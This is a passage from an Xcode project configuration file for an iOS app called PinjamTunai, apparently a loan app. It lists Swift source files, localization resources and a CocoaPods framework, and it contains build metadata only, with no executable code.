// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		55B84C2E87AE5ADD7E833F81 /* Pods_PinjamTunai.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3B3A98329D2930528865FDC3 /* Pods_PinjamTunai.framework */; };
		731114A02EE7AEEF0036A024 /* SystemCameraManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7311149F2EE7AEEE0036A024 /* SystemCameraManager.swift */; };
		731114A22EE7BCA00036A024 /* PopCommonAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731114A12EE7BCA00036A024 /* PopCommonAlertView.swift */; };
		731114A42EE7C99D0036A024 /* PopListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731114A32EE7C99D0036A024 /* PopListView.swift */; };
		731114A72EE7D8020036A024 /* BasicViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731114A62EE7D8020036A024 /* BasicViewController.swift */; };
		731114A92EE7E3010036A024 /* BasicTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731114A82EE7E3010036A024 /* BasicTableViewCell.swift */; };
		731114AB2EE7E30B0036A024 /* TapTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731114AA2EE7E30B0036A024 /* TapTableViewCell.swift */; };
		731114AD2EE7E41C0036A024 /* BasicViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731114AC2EE7E41C0036A024 /* BasicViewModel.swift */; };
		731114AF2EE7E9F30036A024 /* PopOneView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731114AE2EE7E9F30036A024 /* PopOneView.swift */; };
		731114B12EE7E9FE0036A024 /* PopThreeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731114B02EE7E9FE0036A024 /* PopThreeView.swift */; };
		73145EE72EE695DB006085E8 /* AppRouteConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145EE62EE695CE006085E8 /* AppRouteConfig.swift */; };
		73145EE92EE69A28006085E8 /* AuthListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145EE82EE69A28006085E8 /* AuthListViewController.swift */; };
		73145EEB2EE69A49006085E8 /* AuthListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145EEA2EE69A41006085E8 /* AuthListViewModel.swift */; };
		73145EED2EE69A55006085E8 /* AuthListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145EEC2EE69A55006085E8 /* AuthListView.swift */; };
		73145EEF2EE69A8A006085E8 /* AppHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145EEE2EE69A8A006085E8 /* AppHeadView.swift */; };
		73145EF12EE6A200006085E8 /* AuthListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145EF02EE6A200006085E8 /* AuthListViewCell.swift */; };
		73145EF32EE6B6BC006085E8 /* LanguageManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145EF22EE6B6BB006085E8 /* LanguageManager.swift */; };
		73145EFD2EE6B8E9006085E8 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 73145EFB2EE6B8E9006085E8 /* Localizable.strings */; };
		73145F022EE6C85D006085E8 /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145F012EE6C85D006085E8 /* FaceViewController.swift */; };
		73145F042EE6C89D006085E8 /* FaceView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145F032EE6C89D006085E8 /* FaceView.swift */; };
		73145F062EE6C8CD006085E8 /* StepView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145F052EE6C8C2006085E8 /* StepView.swift */; };
		73145F082EE6D289006085E8 /* FaceListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145F072EE6D289006085E8 /* FaceListView.swift */; };
		73145F0A2EE6D954006085E8 /* FaceViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73145F092EE6D952006085E8 /* FaceViewModel.swift */; };
		731565002EE6E3FE00599239 /* CenterView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731564FF2EE6E3FE00599239 /* CenterView.swift */; };
		731565022EE6E7EB00599239 /* CenterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731565012EE6E7E900599239 /* CenterViewModel.swift */; };
		731565042EE6E94300599239 /* CenterTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731565032EE6E94300599239 /* CenterTableViewCell.swift */; };
		731565082EE707E600599239 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731565072EE707E600599239 /* SettingViewController.swift */; };
		7315650A2EE708A500599239 /* SettingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731565092EE7089F00599239 /* SettingView.swift */; };
		7315650C2EE70C1D00599239 /* PopSettingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7315650B2EE70C1D00599239 /* PopSettingView.swift */; };
		7315650E2EE70F6F00599239 /* SettingViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7315650D2EE70F6B00599239 /* SettingViewModel.swift */; };
		731565102EE710A800599239 /* PopDelAccView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7315650F2EE710A100599239 /* PopDelAccView.swift */; };
		731565122EE715CE00599239 /* PopFaceView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731565112EE715C700599239 /* PopFaceView.swift */; };
		731F23182EE9062D00C586BB /* OrderListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F23172EE9062500C586BB /* OrderListView.swift */; };
		731F231A2EE90FD000C586BB /* OrderListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F23192EE90FD000C586BB /* OrderListViewCell.swift */; };
		731F231C2EE910D300C586BB /* OrderListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F231B2EE910D000C586BB /* OrderListViewModel.swift */; };
		731F231E2EE91BA900C586BB /* DashedLineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F231D2EE91BA800C586BB /* DashedLineView.swift */; };
		731F23202EE9205D00C586BB /* OrderMinListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F231F2EE9204A00C586BB /* OrderMinListView.swift */; };
		731F23222EE9251700C586BB /* OrderEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F23212EE9251700C586BB /* OrderEmptyView.swift */; };
		731F23242EE93FA100C586BB /* AppLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F23232EE93F9600C586BB /* AppLocationManager.swift */; };
		731F23262EE9503100C586BB /* MacMessageConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F23252EE9503100C586BB /* MacMessageConfig.swift */; };
		731F23282EE9504F00C586BB /* ProudConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F23272EE9504F00C586BB /* ProudConfig.swift */; };
		731F232A2EE9532A00C586BB /* GainedConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731F23292EE9532900C586BB /* GainedConfig.swift */; };
		734EA0382EE85F5A00C1B49E /* TwoHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734EA0372EE85F5A00C1B49E /* TwoHeadView.swift */; };
		734EA03A2EE866FF00C1B49E /* ProductAccViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734EA0392EE866FF00C1B49E /* ProductAccViewCell.swift */; };
		7365DAC72EEABB1A00AF51FA /* ErrorView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7365DAC62EEABB1A00AF51FA /* ErrorView.swift */; };
		7368B6392EE8465700ADDA99 /* ReceiptAccountViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7368B6382EE8465700ADDA99 /* ReceiptAccountViewController.swift */; };
		7368B63B2EE8473B00ADDA99 /* ReceiptViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7368B63A2EE8473400ADDA99 /* ReceiptViewModel.swift */; };
		7368B63D2EE84C3300ADDA99 /* WebsiteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7368B63C2EE84C3300ADDA99 /* WebsiteViewController.swift */; };
		737D1ED72EE45467003CC748 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1ECD2EE45467003CC748 /* AppDelegate.swift */; };
		737D1EDA2EE45467003CC748 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 737D1ECE2EE45467003CC748 /* Assets.xcassets */; };
		737D1EDC2EE45467003CC748 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 737D1ED12EE45467003CC748 /* LaunchScreen.storyboard */; };
		737D1EF52EE457E9003CC748 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1EED2EE457E9003CC748 /* BaseViewController.swift */; };
		737D1EF62EE457E9003CC748 /* BaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1EEC2EE457E9003CC748 /* BaseView.swift */; };
		737D1EF82EE45814003CC748 /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1EF72EE45814003CC748 /* BaseNavigationController.swift */; };
		737D1EFA2EE4582E003CC748 /* HttpRequestManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1EF92EE4582E003CC748 /* HttpRequestManager.swift */; };
		737D1EFE2EE45850003CC748 /* LoginConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1EFD2EE4584F003CC748 /* LoginConfig.swift */; };
		737D1F002EE4585B003CC748 /* OrderListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1EFF2EE4585B003CC748 /* OrderListViewController.swift */; };
		737D1F022EE45863003CC748 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F012EE45863003CC748 /* LoginViewController.swift */; };
		737D1F042EE45870003CC748 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F032EE45870003CC748 /* HomeViewController.swift */; };
		737D1F062EE45878003CC748 /* CenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F052EE45878003CC748 /* CenterViewController.swift */; };
		737D1F082EE4597A003CC748 /* ApiPeraConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F072EE4597A003CC748 /* ApiPeraConfig.swift */; };
		737D1F0A2EE45FB1003CC748 /* LaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F092EE45FB1003CC748 /* LaunchViewController.swift */; };
		737D1F0C2EE46C21003CC748 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F0B2EE46C19003CC748 /* BaseModel.swift */; };
		737D1F0E2EE55034003CC748 /* LoadingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F0D2EE55029003CC748 /* LoadingView.swift */; };
		737D1F102EE55843003CC748 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F0F2EE5583E003CC748 /* LaunchViewModel.swift */; };
		737D1F122EE57BA0003CC748 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F112EE57B9F003CC748 /* NetworkMonitor.swift */; };
		737D1F142EE5832E003CC748 /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F132EE5832E003CC748 /* BaseTabBarController.swift */; };
		737D1F162EE587E0003CC748 /* OneView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F152EE587E0003CC748 /* OneView.swift */; };
		737D1F182EE587EA003CC748 /* TwoView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F172EE587EA003CC748 /* TwoView.swift */; };
		737D1F1A2EE587F5003CC748 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F192EE587F1003CC748 /* HomeViewModel.swift */; };
		737D1F1C2EE5B95E003CC748 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F1B2EE5B95E003CC748 /* LoginView.swift */; };
		737D1F1E2EE5CFAC003CC748 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F1D2EE5CFAA003CC748 /* LoginViewModel.swift */; };
		738F4D762EE967F000909C0E /* TrackingViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 738F4D752EE967CF00909C0E /* TrackingViewModel.swift */; };
		738F4D782EE9779900909C0E /* PopTimeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 738F4D772EE9779200909C0E /* PopTimeView.swift */; };
		73DA26B12EE9ACBD0074F30F /* PopSLeaveView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DA26B02EE9ACB60074F30F /* PopSLeaveView.swift */; };
		73FA07E72EE80624006B7452 /* WorkerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FA07E62EE80624006B7452 /* WorkerViewController.swift */; };
		73FA07EA2EE80BFF006B7452 /* RelationViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FA07E92EE80BFF006B7452 /* RelationViewController.swift */; };
		73FA07EE2EE80D38006B7452 /* RelationViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FA07ED2EE80D35006B7452 /* RelationViewModel.swift */; };
		73FA07F02EE80F1D006B7452 /* RelationViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FA07EF2EE80F1D006B7452 /* RelationViewCell.swift */; };
		73FA07F22EE819CA006B7452 /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FA07F12EE819C9006B7452 /* ContactManager.swift */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		33E41DB814B4BFA72F93D9F6 /* Pods-PinjamTunai.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamTunai.debug.xcconfig"; path = "Target Support Files/Pods-PinjamTunai/Pods-PinjamTunai.debug.xcconfig"; sourceTree = "<group>"; };
		3B3A98329D2930528865FDC3 /* Pods_PinjamTunai.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_PinjamTunai.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		7311149F2EE7AEEE0036A024 /* SystemCameraManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SystemCameraManager.swift; sourceTree = "<group>"; };
		731114A12EE7BCA00036A024 /* PopCommonAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopCommonAlertView.swift; sourceTree = "<group>"; };
		731114A32EE7C99D0036A024 /* PopListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopListView.swift; sourceTree = "<group>"; };
		731114A62EE7D8020036A024 /* BasicViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BasicViewController.swift; sourceTree = "<group>"; };
		731114A82EE7E3010036A024 /* BasicTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BasicTableViewCell.swift; sourceTree = "<group>"; };
		731114AA2EE7E30B0036A024 /* TapTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TapTableViewCell.swift; sourceTree = "<group>"; };
		731114AC2EE7E41C0036A024 /* BasicViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BasicViewModel.swift; sourceTree = "<group>"; };
		731114AE2EE7E9F30036A024 /* PopOneView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopOneView.swift; sourceTree = "<group>"; };
		731114B02EE7E9FE0036A024 /* PopThreeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopThreeView.swift; sourceTree = "<group>"; };
		73145EE62EE695CE006085E8 /* AppRouteConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppRouteConfig.swift; sourceTree = "<group>"; };
		73145EE82EE69A28006085E8 /* AuthListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthListViewController.swift; sourceTree = "<group>"; };
		73145EEA2EE69A41006085E8 /* AuthListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthListViewModel.swift; sourceTree = "<group>"; };
		73145EEC2EE69A55006085E8 /* AuthListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthListView.swift; sourceTree = "<group>"; };
		73145EEE2EE69A8A006085E8 /* AppHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHeadView.swift; sourceTree = "<group>"; };
		73145EF02EE6A200006085E8 /* AuthListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthListViewCell.swift; sourceTree = "<group>"; };
		73145EF22EE6B6BB006085E8 /* LanguageManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LanguageManager.swift; sourceTree = "<group>"; };
		73145EFA2EE6B7E0006085E8 /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
		73145EFC2EE6B8E9006085E8 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
		73145EFE2EE6B900006085E8 /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/Localizable.strings; sourceTree = "<group>"; };
		73145F012EE6C85D006085E8 /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
		73145F032EE6C89D006085E8 /* FaceView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceView.swift; sourceTree = "<group>"; };
		73145F052EE6C8C2006085E8 /* StepView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepView.swift; sourceTree = "<group>"; };
		73145F072EE6D289006085E8 /* FaceListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceListView.swift; sourceTree = "<group>"; };
		73145F092EE6D952006085E8 /* FaceViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewModel.swift; sourceTree = "<group>"; };
		731564FF2EE6E3FE00599239 /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
		731565012EE6E7E900599239 /* CenterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewModel.swift; sourceTree = "<group>"; };
		731565032EE6E94300599239 /* CenterTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterTableViewCell.swift; sourceTree = "<group>"; };
		731565072EE707E600599239 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
		731565092EE7089F00599239 /* SettingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingView.swift; sourceTree = "<group>"; };
		7315650B2EE70C1D00599239 /* PopSettingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopSettingView.swift; sourceTree = "<group>"; };
		7315650D2EE70F6B00599239 /* SettingViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewModel.swift; sourceTree = "<group>"; };
		7315650F2EE710A100599239 /* PopDelAccView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopDelAccView.swift; sourceTree = "<group>"; };
		731565112EE715C700599239 /* PopFaceView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopFaceView.swift; sourceTree = "<group>"; };
		731F23172EE9062500C586BB /* OrderListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListView.swift; sourceTree = "<group>"; };
		731F23192EE90FD000C586BB /* OrderListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewCell.swift; sourceTree = "<group>"; };
		731F231B2EE910D000C586BB /* OrderListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewModel.swift; sourceTree = "<group>"; };
		731F231D2EE91BA800C586BB /* DashedLineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashedLineView.swift; sourceTree = "<group>"; };
		731F231F2EE9204A00C586BB /* OrderMinListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderMinListView.swift; sourceTree = "<group>"; };
		731F23212EE9251700C586BB /* OrderEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEmptyView.swift; sourceTree = "<group>"; };
		731F23232EE93F9600C586BB /* AppLocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLocationManager.swift; sourceTree = "<group>"; };
		731F23252EE9503100C586BB /* MacMessageConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MacMessageConfig.swift; sourceTree = "<group>"; };
		731F23272EE9504F00C586BB /* ProudConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProudConfig.swift; sourceTree = "<group>"; };
		731F23292EE9532900C586BB /* GainedConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GainedConfig.swift; sourceTree = "<group>"; };
		734EA0372EE85F5A00C1B49E /* TwoHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TwoHeadView.swift; sourceTree = "<group>"; };
		734EA0392EE866FF00C1B49E /* ProductAccViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductAccViewCell.swift; sourceTree = "<group>"; };
		7365DAC62EEABB1A00AF51FA /* ErrorView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ErrorView.swift; sourceTree = "<group>"; };
		7368B6382EE8465700ADDA99 /* ReceiptAccountViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReceiptAccountViewController.swift; sourceTree = "<group>"; };
		7368B63A2EE8473400ADDA99 /* ReceiptViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReceiptViewModel.swift; sourceTree = "<group>"; };
		7368B63C2EE84C3300ADDA99 /* WebsiteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebsiteViewController.swift; sourceTree = "<group>"; };
		737D1EB52EE4545E003CC748 /* PinjamTunai.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PinjamTunai.app; sourceTree = BUILT_PRODUCTS_DIR; };
		737D1ECD2EE45467003CC748 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		737D1ECE2EE45467003CC748 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		737D1ECF2EE45467003CC748 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		737D1ED02EE45467003CC748 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		737D1EDE2EE45650003CC748 /* PinjamTunai.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = PinjamTunai.entitlements; sourceTree = "<group>"; };
		737D1EEC2EE457E9003CC748 /* BaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseView.swift; sourceTree = "<group>"; };
		737D1EED2EE457E9003CC748 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		737D1EF72EE45814003CC748 /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
		737D1EF92EE4582E003CC748 /* HttpRequestManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestManager.swift; sourceTree = "<group>"; };
		737D1EFD2EE4584F003CC748 /* LoginConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginConfig.swift; sourceTree = "<group>"; };
		737D1EFF2EE4585B003CC748 /* OrderListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewController.swift; sourceTree = "<group>"; };
		737D1F012EE45863003CC748 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		737D1F032EE45870003CC748 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		737D1F052EE45878003CC748 /* CenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewController.swift; sourceTree = "<group>"; };
		737D1F072EE4597A003CC748 /* ApiPeraConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ApiPeraConfig.swift; sourceTree = "<group>"; };
		737D1F092EE45FB1003CC748 /* LaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewController.swift; sourceTree = "<group>"; };
		737D1F0B2EE46C19003CC748 /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
		737D1F0D2EE55029003CC748 /* LoadingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingView.swift; sourceTree = "<group>"; };
		737D1F0F2EE5583E003CC748 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
		737D1F112EE57B9F003CC748 /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
		737D1F132EE5832E003CC748 /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
		737D1F152EE587E0003CC748 /* OneView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OneView.swift; sourceTree = "<group>"; };
		737D1F172EE587EA003CC748 /* TwoView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TwoView.swift; sourceTree = "<group>"; };
		737D1F192EE587F1003CC748 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		737D1F1B2EE5B95E003CC748 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		737D1F1D2EE5CFAA003CC748 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		738F4D752EE967CF00909C0E /* TrackingViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrackingViewModel.swift; sourceTree = "<group>"; };
		738F4D772EE9779200909C0E /* PopTimeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopTimeView.swift; sourceTree = "<group>"; };
		73DA26B02EE9ACB60074F30F /* PopSLeaveView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopSLeaveView.swift; sourceTree = "<group>"; };
		73FA07E62EE80624006B7452 /* WorkerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkerViewController.swift; sourceTree = "<group>"; };
		73FA07E92EE80BFF006B7452 /* RelationViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RelationViewController.swift; sourceTree = "<group>"; };
		73FA07ED2EE80D35006B7452 /* RelationViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RelationViewModel.swift; sourceTree = "<group>"; };
		73FA07EF2EE80F1D006B7452 /* RelationViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RelationViewCell.swift; sourceTree = "<group>"; };
		73FA07F12EE819C9006B7452 /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
		AA6D43098812CC6F40AAEA73 /* Pods-PinjamTunai.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamTunai.release.xcconfig"; path = "Target Support Files/Pods-PinjamTunai/Pods-PinjamTunai.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		737D1EB22EE4545E003CC748 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				55B84C2E87AE5ADD7E833F81 /* Pods_PinjamTunai.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		0DC7A24265BD969474F3051E /* Frameworks */ = {
			isa = PBXGroup;
			children = (
